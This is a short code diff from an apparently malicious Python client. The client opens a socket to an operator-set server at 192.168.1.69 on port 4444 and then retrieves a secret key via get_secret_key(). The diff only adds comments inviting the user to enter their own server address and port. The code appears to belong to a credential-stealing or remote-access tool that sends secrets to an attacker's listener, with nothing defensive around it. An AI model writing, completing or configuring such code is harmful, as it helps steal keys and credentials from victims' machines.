@@ -68,8 +68,8 @@ else:
 if __name__ == '__main__':
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ip = '192.168.1.69'
-        port = 4444
+        ip = '192.168.1.69' # write your server ip here
+        port = 4444 # write your server's port here
         client.connect((ip, port))
 
         secret_key = get_secret_key()
